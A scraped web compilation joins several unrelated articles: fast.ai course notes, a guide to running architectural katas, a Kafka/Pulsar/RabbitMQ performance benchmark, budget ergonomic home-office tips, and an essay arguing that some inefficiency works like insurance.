<li>Computer vision, including image classification (e.g.,classifying pet photos by breed), and image localization and detection (e.g.,finding where the animals in an image are)</li>
<li>Natural language processing (NLP), including document classification (e.g.,movie review sentiment analysis) and language modeling</li>
<li>Tabular data (e.g.,sales prediction) with categorical data, continuous data, and mixed data, including time series</li>
<li>Collaborative filtering (e.g.,movie recommendation)</li>
</ul>
</li>
<li>How to turn your models into web applications, and deploy them</li>
<li>Why and how deep learning models work, and how to use that knowledge to improve the accuracy, speed, and reliability of your models</li>
<li>The latest deep learning techniques that really matter in practice</li>
<li>How to implement stochastic gradient descent and a complete training loop from scratch</li>
<li>How to think about the ethical implications of your work, to help ensure that you’re making the world a better place and that your work isn’t misused for harm</li>
</ul>
<p>We care a lot about teaching, using a <a href="https://www.fast.ai/2016/10/08/teaching-philosophy/">whole game</a> approach. In this course, we start by showing how to use a complete, working, very usable, state-of-the-art deep learning network to solve real-world problems, using simple, expressive tools. And then we gradually dig deeper and deeper into understanding how those tools are made, and how the tools that make those tools are made, and so on. We always teach through examples. We ensure that there is a context and a purpose that you can understand intuitively, rather than starting with algebraic symbol manipulation. We also dive right into the details, showing you how to build all the components of a deep learning model from scratch, including discussing performance and optimization details.</p>
<p>The whole course can be completed for free without any installation, by taking advantage of the guides for the Colab and Gradient platforms, which provide free, GPU-powered Notebooks.</p>
<h2 id="deep-learning-for-coders-with-fastai-and-pytorch-the-book">Deep Learning for Coders with fastai and PyTorch, the book</h2>
<p>To understand what the new book is about, and who it’s for, let’s see what others have said about it… Soumith Chintala, the co-creator of PyTorch, said in <a href="https://www.fast.ai/2020/08/20/soumith-forward/">the foreword</a> to <a href="https://www.amazon.com/Deep-Learning-Coders-fastai-PyTorch/dp/1492045527">Deep Learning for Coders with fastai and PyTorch</a>:</p>

<p>Architectural katas are a great way to spice up the architectural skills of your team or community, and practice to have productive discussions about architecture.</p>

<p>I always receive great feedback after (co)-organizing architectural katas <sup id="fnref:1"><a href="#fn:1">1</a></sup> and I regularly get questions on organizing them with others.  So with Matteo Pierro, I did run a session at XP-days Benelux 2019 on how you can organize these katas yourself, sharing experiences to encourage others organizing the same kind of katas.</p>



<p>Ivory tower architects defining the architecture for your team are from a bygone era. The general trend is that development <em>teams define their software architecture</em>, or at least that teams are strongly involved in defining the architecture.</p>

<p>But people cannot learn architecture well out of thin air, they need a way to learn and practice. This was also the main motivation of <a href="https://nelis.boucke.be/post/architectural-katas/1" title="Thanks to [Erik Talboom](https://twitter.com/talboomerik), [Michel Daviot](https://twitter.com/tyrcho) and [Matteo Pierro](https://twitter.com/matteo_pierro) for co-organising some of the architectural katas.

<p>“How do we get great designers? Great designers design, of course.”
Fred Brooks</p>

<p>”So how are we supposed to get great architects, if they only get the chance  to architect fewer than a half-dozen times in their career?”
Ted Neward</p>
</blockquote>

<p>Ted was searching for a way to practice defining architectures and, inspiration by <a href="http://codekata.com/" title="Code katas">code katas</a>, came up with the concept of architectural katas.</p>

<p>Architectural katas are a workshop were several small groups (3-5 people) practice discussing and designing architectures. Typically the workshop involves several iterations.</p>

<p>At the start of an iteration, each group gets a project description and some constraints, and gets some time to discover what is needed, ask clarifying questions to the “customer” (often the facilitator), discusses technology options, and design a vision for the architecture.</p>

<p>After discussing for a while, each group presents their results to the other groups to gather feedback. The iteration ends with some reflection and a break.</p>

<p>For more information, check out the <a href="http://www.architecturalkatas.com/about.html" title="About architectural katas">description on the architectural kata website</a>.</p>



<p>Organizing a good workshop asks for proper preparation and facilitation. It might look daunting at first, but I hope the next sections can help you on your way.</p>

<p>The learnings in this post are extracted from organizing events like this over 2 years, from evening meetups, conference sessions, open full-day sessions till closed company sessions. The audience for those sessions varied between 10 people and 40 people.</p>

<h3 id="who-to-invite">Who to invite?</h3>

<p>You can invite any team members or people in the community interested in discussing the architecture. This includes, but is not limited to, developers, testers, product owners, analysts, scrum masters, architects … It helps if the majority of the people have software development experience or affinity, but it is not a strict requirement for all participants.</p>

<p>No prior experience as an architect is required. I prefer a mixture of roles and backgrounds to have healthy discussions and to make assumptions explicit.</p>

<h3 id="when">When</h3>

<p>I run architectural katas as a workshop on a meetup, conference or in a company. As far as I understood, Ted did run it as a regular event with the same community.</p>

<h3 id="what-kind-of-environment">What kind of environment?</h3>

<p>Some important aspects of the environment setup are:</p>

<ul>
<li><em>Provide unlimited modeling Space</em>: You need a good modeling space per group. To often, people will stop architecting as soon as the allocated space is full and you might miss out on some nice creativity or discussion. My experience is that very large (magic) whiteboard<sup id="fnref:2"><a href="#fn:2">2</a></sup> trumps a smaller whiteboard, which trumps a Flipchart, which trumps a table with Flipchart paper, which trumps table with smaller size papers.</li>
<li><em>Room</em>: The above requirements for a modeling space in combination with a lot of people discussing in small groups ask for a spacious room (or several rooms). People need space to discuss comfortable and the noise level must remain acceptable so people can understand each other. For larger workshops with more than 4 groups, I prefer to use several break-out rooms.</li>
<li><em>Materials</em>: Bring enough post-its of several sizes and forms, papers, good whiteboard, and permanent markers.<br></li>
<li><em>Food / drinks</em>: These types of workshops can be very exhausting, especially if you keep on iterating all day long. Catering for sugar dips and the need for drinks helps people to stay focused.</li>
</ul>

<h3 id="projects">Projects?</h3>

<p>Each kata starts from a brief (and intentionally vague and incomplete) project description. Ted Neward did the effort to set up a website to gather and share these project descriptions on <a href="https://nelis.boucke.be/post/architectural-katas/2" title="[Magic whiteboard](https://www.magicwhiteboard.co.uk/) seems to stick very well.
">http://www.architecturalkatas.com/</a>.</p>

<p>Although the Ted talks about drawing a random kata for each group until now I always preselected the project and asked all groups to do the same project. My main motivation is to allow for a more efficient exchange in the feedback and reflection phase.</p>

<p>When selecting a kata it is important to think about your audience. Are they completely new to the format? Are there people with an architectural background in the groups? Do they know about embedded development?  Some challenges are a lot more complex to break into than others or require specialized knowledge your audience might not have.</p>

<p>I like the “Room with a View” as starter kata, as most people have been in contact with hotels and thus have a basic knowledge of the domain.</p>

<blockquote>
<h2 id="room-with-a-view">Room With A View</h2>

<p>A large hotel reservation company wants to build the next generation hotel reservation and management system specifically tailored to high-end resorts and spas where guests can view and reserve specific rooms.</p>

<p>Users: Guests (hundreds), hotel staff (less than 20)</p>

<p>Requirements:</p>

<ul>
<li><p>Registration can be made via web, mobile, phone call, or walk-in.</p></li>

<li><p>Guests have the ability to either book a type of room (standard, deluxe, or suite) or choose a specific room to stay in by viewing pictures of each room and its location in the hotel.</p></li>

<li><p>The system must be able to maintain room status (booked, available, ready to clean, etc.) as well as when the room will be needed next.</p></li>

<li><p>It must also have state-of-the-art housekeeping management functionality so that cleaning and maintenance staff can be directed to various rooms based on priority and reservation need using proprietary devices supplied by the reservation company attached to the cleaning carts.</p></li>

<li><p>Standard reservation functionality (e.g., payments, registration info, etc.) will be done by leveraging the existing reservations system.</p></li>

<li><p>The system will be web-based and hosted by the reservation company.</p></li>
</ul>

<p>Additional Context: ‘Peak season is quickly approaching, so the system must be ready quickly or we have to wait until next year!’; Company is also investing heavily in cutting edge technology like smart room locks that open via a cell phone; Only interested in the high-end market; Sales people have tremendous clout in the organization; people often scramble to make their promises true</p>
</blockquote>

<p>Others I often use in the beginning are ‘Check your work’, ‘Am I Sick’ or ‘All stuff no cruft’.</p>

<p>Another one I always keep around for more challenge is ‘World of web craft’ because it goes beyond a simple website and thus contains a lot more challenges for most people.</p>

<h3 id="additional-constraints">Additional constraints</h3>

<p>Similar to coding katas, I try adding additional constraints to maximize the learning effect and focus on a specific learning goal. For example, you could use a kata to learn a new modeling language or practice. Or through a constraint, you can exaggerate a practice you get it into your muscle memory.</p>

<p>Examples of constraints are:</p>

<ul>
<li>Use the <a href="https://c4model.com/" title="C4 model website">C4 model</a> to document your architectural vision. The C4 model is a simple set of models to visualize the static structure of a software architecture. By giving people a simple and standardized way to visualize their decisions in architectural models, there are suddenly a lot fewer misunderstandings and a more high-quality discussion. I typically use the following flip charts where I add the post-its one by one to introduce the C4 model.</li>
<li>Explicitly try to use only existing cloud services and build nothing.</li>
<li>Use all cloud services.</li>
<li>A component should have only two other components to talk to.</li>
<li>Use event storming to identify the behavior, and update your C4 with this.</li>
</ul>

<p>The constraints might vary in different iterations. For example, I might give no constraint in the first iteration, use C4 as a constraint in the second iteration, use event storming to discover more behavior in the third iteration and finally update the C4 model to represent that behavior.</p>

<h3 id="agenda-and-timing">Agenda and timing</h3>

<p>A typical cycle for a single kata session takes about 1u20 min:</p>

<ul>
<li>10min: Introduction to the kata and the constraints</li>
<li>45min: Team discussion</li>
<li>15min: Review and share architecture</li>
<li>10min: Reflect and share observations</li>
</ul>

<p>I experimented with longer and shorter discussion slots, but 45min seems to be the sweet spot where people are still engaged, but also need a trigger for new ideas. Reviewing, reflecting and starting a new cycle is a perfect way to bring inspiration.</p>

<p>Depending on the amount of time you have, you can repeat the cycle several times. Including a 10 minute break, a cycle then takes 1:30.</p>

<p>Some of the things I did:</p>

<ul>
<li><em>Session of 1h30 to 2h</em>: A single iteration is too short to get a lot of in-depth learning about architecture. I did this several times, but I would only advise running such short sessions to convince people to try this themselves (as was my goal on some conferences and this blogpost). Or maybe if you repeat this weekly it could work, but I never tried.</li>
<li><em>Session between 3h and 4h30</em>: Two to three iterations start to be interesting. People can apply the things they learned during the sharing and reflection in future sessions. If I do only two …</li></ul></article></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Apache Kafka<sup>®</sup> is one of the most popular event streaming systems. There are many ways to <a href="https://www.confluent.io/kafka-vs-pulsar/">compare systems</a> in this space, but one thing everyone cares about is performance. Kafka has been known to be <a href="https://engineering.linkedin.com/kafka/benchmarking-apache-kafka-2-million-writes-second-three-cheap-machines" target="_blank" rel="noopener noreferrer">fast</a>, but how fast is it today, and how does it stack up against other systems? We decided to test Kafka’s performance on the latest cloud hardware to find out.</p>
<p>For comparisons, we chose a traditional message broker, <a href="https://www.rabbitmq.com/" target="_blank" rel="noopener noreferrer">RabbitMQ</a>, and one of the <a href="https://bookkeeper.apache.org/" target="_blank" rel="noopener noreferrer">Apache BookKeeper™</a>&nbsp;based message brokers, <a href="http://pulsar.apache.org/" target="_blank" rel="noopener noreferrer">Apache Pulsar</a>. We focused on (1) <strong>system throughput</strong> and (2) <strong>system latency</strong>, as these are the primary performance metrics for event streaming systems in production. In particular, the throughput test measures how efficient each system is in utilizing the hardware, specifically the disks and the CPU. The latency test measures how close each system is to delivering real-time messaging including tail latencies of up to p99.9th percentile, a key requirement for real-time and mission-critical applications as well as microservices architectures.</p>
<p>We found that Kafka delivers the best throughput while providing the lowest end-to-end latencies up to the p99.9th percentile. At lower throughputs, RabbitMQ delivers messages at very low latencies.</p>

<p>This blog post is structured to first walk you through the benchmarking framework we used, followed by a description of the testbed and the workloads. It will finish with an explanation of the results using the various system and application metrics. All of these are <a href="https://github.com/confluentinc/openmessaging-benchmark/" target="_blank" rel="noopener noreferrer">open source</a>, so curious readers can reproduce the results for themselves or dig deeper into the collected Prometheus metrics. As with most benchmarks, we compare performance on a setup for a specific workload. We always encourage readers to compare using their own workloads/setups, to understand how these translate to production deployments.

</ul>
<h2 id="background"><a id="background"></a>Background</h2>
<p>First, let’s discuss each of the systems briefly to understand their high-level design and architecture, looking at the trade-offs each system makes.</p>
<p><strong>Kafka</strong> is an open-source distributed event streaming platform, and one of the five most active projects of the Apache Software Foundation. At its core, Kafka is designed as a replicated, distributed, persistent commit log that is used to power event-driven microservices or large-scale stream processing applications. Clients produce or consume events directly to/from a cluster of brokers, which read/write events durably to the underlying file system and also automatically replicate the events synchronously or asynchronously within the cluster for fault tolerance and high availability.</p>
<p><strong>Pulsar</strong> is an open-source distributed pub/sub messaging system originally catered towards queuing use cases. It recently added event streaming functionality as well. Pulsar is designed as a tier of (almost) stateless broker instances that connect to a separate tier of BookKeeper instances, which actually read/write and, optionally, store/replicate the messages durably. Pulsar is not the only system of its kind as there are also other messaging systems like Apache DistributedLog and Pravega, which have been created on top of BookKeeper and aim to also provide some Kafka-like event streaming functionality.</p>
<p><strong>BookKeeper</strong> is an open-source distributed storage service that was originally designed as a write-ahead log for Apache™ Hadoop®’s NameNode. It provides persistent storage of messages in <em>ledgers</em>, across server instances called <em>bookies</em>. Each bookie synchronously writes each message to a local journal log for recovery purposes and then asynchronously into its local indexed ledger storage. Unlike Kafka brokers, bookies do not communicate with each other and it’s the BookKeeper clients that are responsible for replicating the messages across bookies using a quorum-style protocol.</p>
<p><strong>RabbitMQ</strong> is an open-source traditional messaging middleware that implements the AMQP messaging standard, catering to low-latency queuing use cases. RabbitMQ consists of a set of broker processes that host “exchanges” for publishing messages to and queues for consuming messages from. Availability and durability are properties of the various queue types offered. Classic queues offer the least availability guarantees. Classic mirrored queues replicate messages to other brokers and improve availability. Stronger durability is provided through the more recently introduced <a href="https://www.rabbitmq.com/quorum-queues.html" target="_blank" rel="noopener noreferrer">quorum queues</a> but at the <a href="https://www.rabbitmq.com/quorum-queues.html#use-cases" target="_blank" rel="noopener noreferrer">cost of performance</a>. Since this is a performance-oriented blog post, we restricted our evaluation to classic and mirrored queues.</p>
<h2 id="durability"><a id="durability"></a>Durability in distributed systems</h2>
<p>Single-node storage systems (e.g., RDBMS) depend on fsyncing writes to disk to ensure maximal durability. But in distributed systems, durability typically comes from replication, with multiple copies of the data that fail independently. Fsyncing data is just a way of reducing the impact of the failure when it does occur (e.g., fsyncing more often could lead to lower recovery time). Conversely, if enough replicas fail, a distributed system may be unusable regardless of fsync or not. Hence, whether we fsync or not is just a matter of what guarantees each system chooses to depend on for its replication design. While some depend closely on never losing data written to disk, thus requiring fsync on every write, others handle this scenario in their design.</p>
<p>Kafka’s replication protocol was carefully designed to ensure consistency and durability guarantees without the need for synchronous fsync by tracking what has been fsynced to the disk and what hasn’t. By assuming less, Kafka can handle a wider range of failures like filesystem-level corruptions or accidental disk de-provisioning and does not take for granted the correctness of data that is not known to be fsync’d. Kafka is also able to leverage the OS for batching writes to the disk for better performance.</p>
<p>We have not been able to ascertain categorically whether BookKeeper offers the same consistency guarantees without fsyncing each write—specifically, whether it can rely on replication for fault tolerance in the absence of synchronous disk persistence. This isn’t covered in the documentation or a write-up on the underlying replication algorithm. Based on our inspection and the fact that BookKeeper implements a grouped fsync algorithm, we believe it does rely on fsyncing on each write for its correctness, but we’d love to <a href="mailto:info@confluent.io" target="_blank" rel="noopener noreferrer">hear from folks</a> in the community who might know better if our conclusion is correct.</p>
<p>In any case, since this can be somewhat of a controversial topic, we’ve given results in both cases to ensure we are being as fair and complete as possible, though running Kafka with synchronous fsync is extremely uncommon and also unnecessary.</p>
<h2 id="benchmarking-framework"><a id="benchmarking-framework"></a>Benchmarking framework</h2>
<p>With any benchmark, one wonders what framework is being used and if it’s fair. To that end, we wanted to use the <a href="http://openmessaging.cloud/docs/benchmarks/" target="_blank" rel="noopener noreferrer">OpenMessaging Benchmark Framework</a> (OMB), originally authored, in large parts, by Pulsar contributors. OMB was a good starting point with basic workload specification, metrics collection/reporting for the test results, support for the three chosen messaging systems as well as a modular cloud deployment workflow tailored for each system. But of note, Kafka and RabbitMQ implementations did have some significant shortcomings that affected the fairness and reproducibility of these tests. The resulting benchmarking code including the fixes described in more detail below are available as <a href="https://github.com/confluentinc/openmessaging-benchmark" target="_blank" rel="noopener noreferrer">open source</a>.</p>
<h3 id="omb-framework"><a id="omb-framework"></a>Fixes to the OMB Framework</h3>
<p>We upgraded to Java 11 and Kafka 2.6, RabbitMQ 3.8.5, and Pulsar 2.6 (the latest releases at the time of writing). We significantly enhanced the monitoring capabilities across the three systems, with the Grafana/Prometheus monitoring stack, capturing metrics across messaging systems, JVM, Linux, disk, CPU, and network. This was critical for being able to not just report results but explain them. We have added support for producer-only tests and consumer-only tests with support for generating/draining backlogs, while also fixing an important bug with producer rate calculation when the number of topics is smaller than the number of producer workers.</p>
<h3 id="omb-kafka-driver"><a id="omb-kafka-driver"></a>Fixes to the OMB Kafka driver</h3>
<p>We fixed a critical bug in the Kafka driver that starved Kafka producers of TCP connections, bottlenecking on a single connection from each worker instance. The fix makes the Kafka numbers fair, compared to other systems—that is, all of them now use the same number of TCP connections to talk to their respective brokers. We also fixed a critical bug in the Kafka benchmark consumer driver, where offsets were being committed too frequently and synchronously causing degradation, whereas it was done asynchronously for other systems. We also tuned the Kafka consumer fetch size and replication threads to eliminate bottlenecks in message fetching at high throughputs and to configure the brokers equivalent to the other systems.</p>
<h3 id="omb-rabbitmq-driver"><a id="omb-rabbitmq-driver"></a>Fixes to the OMB RabbitMQ driver</h3>
<p>We enhanced RabbitMQ to use routing keys and configurable exchange types (<code>DIRECT</code> and <code>TOPIC</code> exchanges) and also fixed a bug in the RabbitMQ cluster setup deployment workflow. Routing keys were introduced to mimic the concept of partitions per …</p></div></div></div>

<p><span>Written: 06 Aug 2020 by <i>Rachel Thomas</i></span></p><p>You weren’t expecting to spend 2020 working from home. You can’t afford a fancy standing desk. You don’t have a home office, or even much spare space, in your apartment. Your neck is getting a permanent crick from hunching over your laptop on the couch. While those of us who are able to work from home are privileged to have this option, we still don’t want to permanently damage our backs, necks, or arms from a bad ergonomic setup.</p>
<p>This is not a post for ergonomic aficionados (the setups I share could all be further optimized). This is a post for folks who don’t know where to get started, have a limited budget, and are willing to try simple, scrappy approaches. Key takeway: for 34 dollars (21 for a good mouse, and 13 for a cheap keyboard), as well as some household items, you can create an ergonomic setup like the one below. I will show many other options throughout the post, for both sitting and standing, as well as approaches you can easily assemble/disassemble (if you are using the family dinner table and need to clear it off each evening).</p>

<h2 id="damage">You can permanently damage your body with bad ergonomics</h2>
<p>You can permanently damage your back, neck, and wrists from working without an ergonomic setup. Almost two decades ago, my partner Jeremy suffered from repetitive stress injury due to working without an ergonomic setup. At the time, his arms were paralyzed and he had to take months off from work. Even now and after years filled with good ergonomics and yoga, this still impacts his life, severely limiting how much time he can spend in cars or on planes, and creating painful flare-ups. Please take this issue seriously.</p>
<h2 id="separate">Key advice: Have a separate keyboard and mouse</h2>
<p>The most important thing to know is that you want your screen approximately at eye height, and your elbows at approximately right angles to your torso as they type and use the mouse. This is the case whether you are sitting or standing. If you are using a laptop, this will be impossible with the built-in keyboard and trackpad (no matter how nice they are). It is essential to have a separate keyboard and mouse. If you only do one thing to address ergonomics, obtain a separate keyboard and mouse.</p>
<p>If you can’t afford an external monitor, no worries, you can just elevate your laptop. Over the years, I have used cardboard boxes, drinking glasses, bottles of soda, board games, and stacks of books to elevate my laptop. I will recommend some keyboards and mice that I like below, but anything is better than using the ones built into your laptop (since that forces you to keep your screen at the wrong height). For example, the picture in the intro is of a set-up I created while visiting a family member’s apartment in 2014, using books and a cardboard box to elevate my keyboard, mouse, and laptop to the appropriate heights.</p>
<figure>
<img width="400" src="https://www.fast.ai/images/ergonomic5.jpg" alt="For the deep learning study group, I routinely used a brown cardboard box. Bonus: I could store everything in the box when we had the clear out of that room each night.">
<figcaption>For the deep learning study group, I routinely used a brown cardboard box. Bonus: I could store everything in the box when we had the clear out of that room each night.</figcaption>
</figure>
<p>Above is a picture from the deep learning study group, which meets 5 days a week, for 7 weeks, every time we run the deep learning course. I use a brown cardboard box to elevate my keyboard. We have to clear out of that conference room each evening, and it is simple for me to put my items in the box. This sort of solution could work if you don’t have a dedicated office space in your home, and need to be able to set up/take down your workstation regularly.</p>
<p>I rarely worked in coffee shops pre-pandemic (and never do now), but when I had to I would still try to create an ergonomic setup (and go to a coffeeshop where there was enough space!). Here, I’ve stacked my laptop on top of my rolled-up backpack. Ideally, my screen would be higher, but this is still better than having it at table level. Don’t let the perfect be the enemy of the good. Every step you take towards a more ergonomic setup is helpful.</p>

<h2 id="standing-desks">About standing desks</h2>
<p>If you have a regular desk (or even just a table) at home and want a standing desk, one option is to convert it using the <a href="https://alphacolin.com/ikea-standing-desk-for-22-dollars/">$22 standing desk approach</a>, which involves an Ikea side table and shelf. I had a previous job in which this was quite popular. Here is a photo of my work desk from that time.</p>

<p>Standing on a hard floor can be difficult for your back. I have a GelPro mat, which I love. If you can’t afford a GelPro mat, standing on a folded-up yoga mat works great too.</p>
<p>Note that standing desks are not a cure-all. I’ve often seen people with expensive standing-desk converters (also known as desktop risers) that still have their monitor way too low. Even if you have an external monitor and desktop riser, makes sure your monitor is at an appropriate height. It is likely you will still need to stack it on top of something. If you don’t like the aesthetics of using books or other household items, you can buy a monitor stand, <a href="https://www.kensington.com/p/products/ergonomic-desk-accessorries/laptop-risers-monitor-stands/kensington-smartfit-monitor-stand-plus-for-up-to-21-screens/">such as this one</a>.</p>
<p>Using a standing desk with poor posture is not very ergonomic, so be cognizant of when you start feeling fatigued. I prefer to switch between standing and sitting throughout the day, as my energy fluctuates.</p>

<h2 id="budget-recs">Budget Recommendations</h2>
<p>My “budget recommendation” would be to get an <a href="https://www.newegg.com/p/0TP-005H-00095">Anker vertical mouse</a> for $21 and literally any keyboard. If you have to choose, I’ve found that having a good mouse is way more important than a good keyboard. It is important that you get some keyboard though, so that you can elevate your laptop screen. In the setup below, I’m using a lightweight travel keyboard that isn’t particularly ergonomic, but it works fine.</p>

</figure>
<p>I realize that at a time when many Americans do not have enough to eat, that you may not have 34 dollars to spare (21 dollars for a mouse and 13 dollars for a cheap keyboard). However, if this is an option for you, it is well worth the cost. If you permanently damage your back, neck, or arms, no amount of money may be enough to heal them later.</p>
<h2 id="products">Other products I like</h2>
<p>My favorite mouse is the <a href="https://www.newegg.com/Logitech-910-001799/p/24W-001B-00008">Logitech wireless trackball mouse</a>. I have also used and liked the <a href="https://www.newegg.com/p/0TP-005H-00095">Anker vertical mouse</a>. For keyboards, I like <a href="https://www.newegg.com/p/12K-00XE-00002">Goldtouch</a> (I use an older version of this one) or the <a href="https://www.newegg.com/microsoft-natural-4000-b2m-00012-usb-wired/p/N82E16823109148">Microsoft Ergonomic Keyboard</a>. And if you are looking for a compact, lightweight travel keyboard, I like the <a href="https://www.iclever.com/products/BK03-Bluetooth-Portable-Keyboard">iClever foldup keyboard</a>.</p>
<p>As mentioned above, <a href="https://www.gelpro.com/">GelPro mats</a> are great if you are going to be standing, and a folded-up yoga mat is a cheaper alternative.</p>
<p>I have a <a href="https://www.therooststand.com/">Roost portable, lightweight laptop stand</a>, which is great, although I can’t use it since I switched from a Macbook Air to a Microsoft Surface Pro. None of the links in this post are affiliate links; I’m just recommending what I’ve personally used and like.</p>
<p>For more about home office set-ups, Jeremy recently posted a twitter thread about his preferred computer set-up (which includes some pricier options). It’s also worth noting that his desk has a small footprint, and fits in the corner of our living room.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote>â€˜Slow down, you move too fast <em>â€¦</em>â€™ <br>â€“ â€˜The 59th Street Bridge Song (Feelinâ€™ Groovy)â€™ (1966) by Paul Simon</blockquote>
<p><strong>We worship efficiency</strong>. Use less to get more. Same-day delivery. Multitask; text on one device while emailing on a second, and perhaps conversing on a third. Efficiency is seen as good. Inefficiency as wasteful.</p>
<p>Thereâ€™s a sound rationale for thinking this way. Economists teach us that increased efficiency is the major way to improve our standard of living. If your company gives you a pay rise without becoming more efficient, it will also have to raise its prices to make up the shortfall. If all companies do the same, everyone ends up running in place â€“ youâ€™ll need your higher wages to match the higher prices of the things you buy. So, if we want to make material progress, we must become more efficient. Streamlined supply chains, just-in-time deliveries and no slack in the workforce all serve to raise efficiency. Achieve this, and all our lives will get better and better, or so weâ€™re promised.</p>
<p>For automobile manufacturers, who wish to squeeze as many miles per gallon as possible out of their car designs, air resistance and the grab of the road are the enemies of efficiency. In the world of finance, it is at the point of exchange that most friction arises. Before money, the potato farmer had to use sacks of potatoes to trade for eggs and milk. As the British historian Niall Ferguson reminds us in his <a href="https://www.penguin.co.uk/books/178/178638/the-ascent-of-money/9780141990262.html">book</a> <em>The Ascent of Money</em> (2008), the invention of money went a long way toward reducing this inefficiency, and much that has happened in the financial world over the past 200 years can be seen as a continuation of that revolution.</p>
<p>Credit, for example, meant that you could go shopping for eggs and milk even without having the money right now. Financial markets have since taken this efficiency to another level. The creation of â€˜option marketsâ€™ means that you donâ€™t have to go to the trouble of buying a stock that youâ€™re going to be selling soon anyway. You can just promise to buy it, and then sell it at a price and date specified by the option contract. And then you can trade the option rather than the underlying stock.</p>
<p>Each of these developments and many others have made it easier to do oneâ€™s business without wasted time and energy â€“ without friction. Each has made economic transactions quicker and more efficient. Thatâ€™s obviously good in some ways. But the financial crisis of 2008 suggested that maybe there could be too much of a good thing. If mortgages and other loans hadnâ€™t been transformed into tradable assets (â€˜securitiesâ€™), then bankers might have taken the time to assess the credit-worthiness of each applicant. If people had to visit a bank to withdraw cash, they might spend less and save more. This is not mere speculation â€“ for instance, <a href="https://doi.org/10.1002/(SICI)1099-0771(199909)12:3%3c183::AID-BDM318%3e3.0.CO;2-F">research</a> <a href="https://doi.org/10.1016/0167-2681(80)90051-7">reviewed</a> by the Nobel Prize-winning economist Richard Thaler shows that people will pay more for an item with a credit card than with cash. Arguably, a little friction to slow us down would have enabled both institutions and individuals to make better financial decisions.</p>
<p>A decade ago, the American psychologist Adam Grant and I argued in a journal <a href="https://journals.sagepub.com/doi/full/10.1177/1745691610393523?url_ver=Z39.88-2003&amp;rfr_id=ori:rid:crossref.org&amp;rfr_dat=cr_pub%20%200pubmed">paper</a> that this â€˜too much of a good thingâ€™ phenomenon might be a general rule. Some motivation produces excellent performance; too much motivation produces choking. Some group collaboration produces cohesion and enhances productivity; too much of it leads to staleness. Some empathy enables you to understand what another person is going through; too much could prevent you from saying and doing hard things. Similarly, in my <a href="https://www.harpercollins.com/products/the-paradox-of-choice-barry-schwartz?variant=32207920234530">book</a> <em>The Paradox of Choice</em> (2004), I argued that, whereas a life with no freedom to choose is not worth living, a life with too much choice leads to paralysis, bad decisions and dissatisfaction. Finding the right amount â€“ what Aristotle called the â€˜meanâ€™ â€“ of motivation, collaboration, empathy, choice and many other aspects of life, including efficiency, is a key challenge we face, both as individuals and as a society.</p>
<p>To be better prepared next time, we need to learn to live less efficiently in the here and now</p>
<p>But finding the mean isnâ€™t easy. As the English poet William Blake observed in <em>The Marriage of Heaven and Hell</em> (1790-93): â€˜You never know what is enough unless you know what is more than enough.â€™</p>
<p><strong>If the financial crisis</strong> taught us that we had become too efficient with our transactions, what of the COVID-19 pandemic? Why hadnâ€™t we stockpiled key supplies and machines, built up hospital capacity, or ensured the robustness of our supply chains? The reason, of course, is that it would have been seen as inefficient and profit-robbing. Money spent on masks and gowns gathering dust in a warehouse could always be put to more â€˜productiveâ€™ use in the marketplace. Likewise, employing more people than needed under â€˜ordinaryâ€™ circumstances, or making products yourself rather than relying on international supply chains, would have been seen as inefficient. One lesson, then, is that to be better prepared next time, we need to learn to live less â€˜efficientlyâ€™ in the here and now.</p>
<p>Seen in this light, at least some inefficiency is like an insurance policy. Think about your own situation. Every year that you donâ€™t get into a car accident and your house doesnâ€™t burn down and you stay healthy, you could think to yourself that you have â€˜wastedâ€™ your money on various pointless insurance products, and that youâ€™d be financially better off without all those insurance premiums to pay.</p>
<p>Most of us donâ€™t like the sense that weâ€™re wasting money on insurance. We would rather be wearing that money, or eating it, or driving it. Some years ago, with a struggle, I convinced my ageing mother to supplement her basic health insurance policy with a more comprehensive insurance product. Her resources were modest and the policy wasnâ€™t cheap. The year went by and, happily, she had no serious medical conditions that required the use of the extra cover. When the time came to renew, my mother resisted, because, indeed, the money she spent the year before had been â€˜wastedâ€™. My reply, perhaps unduly snarky, was to suggest to her that maybe the next year she would get lucky, have a really serious illness, and get her moneyâ€™s worth out of her insurance.</p>
<p>Thankfully, in many domains, government regulations protect us from our desire for ever-greater personal financial efficiency by forcing us to have insurance. Laws require that our cars be insured, and mortgagers require the same for our homes. In the United States, â€˜Obamacareâ€™ (the Affordable Care Act enacted in 2010, designed to increase the number of US citizens covered by health insurance) essentially compelled people to have health insurance, until the Supreme Court challenged this aspect of the Act as unconstitutional. I suspect that many of us are underinsured in general, but the problem would be much worse without these various, state-imposed insurance requirements.</p>
<p>One way to think about insurance, however inefficient it might feel, is that it enables us to be resilient against shocks that could befall us from a world that is radically uncertain. And the world <em>is</em> radically uncertain. As the British economists John Kay and Mervyn King point out in their <a href="https://wwnorton.com/books/9781324004776">book</a> <em>Radical Uncertainty</em> (2020), efforts to quantify risk by attaching probabilities to various unlikely future states of the world are mostly science fiction. The world is much messier than a roulette wheel or a pair of dice.</p>
<p>A little bit of friction can forestall disaster when you encounter an icy road</p>
<p><strong>What should we do</strong> in the face of this radical uncertainty? When making decisions, instead of asking ourselves which option will give us the best results, we should be asking which option will give us good-enough results under the widest range of future states of the world. Instead of trying to maximise return on investment in our retirement account, we should be setting a financial goal and then choosing investments that will allow us to achieve that goal under the widest set of future financial circumstances. Instead of looking for the â€˜bestâ€™ job, we should be looking for a job that will be good enough â€“ satisfying enough â€“ as co-workers and managers come and go, and the future economy gyrates. Instead of choosing the best college to go to, we should be choosing a college that will be good enough, even with an obnoxious roommate and a boring Bio 1 teacher.</p>
<p>The term used to describe this approach to decision-making is <em>satisficing</em>. And satisficing with an eye toward a radically uncertain future might be called <em>robust satisficing</em>. Satisficing is a form of insurance â€“ insurance against financial meltdowns, global pandemics, nasty bosses, boring teachers and crappy roommates. Insurance can seem stodgy â€“ like the guy who wears a belt <em>and</em> suspenders. Perhaps we donâ€™t need both, but what happens if we have neither?</p>
